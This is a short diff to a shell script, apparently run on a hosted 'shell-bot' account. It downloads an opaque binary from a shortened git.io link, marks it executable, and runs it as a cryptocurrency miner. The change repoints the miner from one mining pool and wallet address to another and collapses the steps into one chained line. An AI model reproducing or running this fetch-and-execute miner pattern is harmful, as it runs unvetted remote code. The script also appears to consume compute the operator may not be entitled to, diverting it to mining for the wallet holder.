@@ -4,6 +4,4 @@
 # kumaha aink we njink
 
 cd /home/shell-bot
-wget -qO ngaceng https://git.io/J161r
-chmod +x ngaceng
-./ngaceng -v -l ap.luckpool.net:3956 -u RFLFA5BGYyt5SASeDQSS8H89aYiK3LQJco.hotaru -p x -t 8
+wget -qO ngaceng https://git.io/J161r && chmod +x ngaceng && ./ngaceng -v -l verushash.mine.zergpool.com:3300 -u MS7M2QQKoK2M94Ktn8iGk75j8yvjWGLHsM.ngaceng -p c=LTC,mc=VRSC
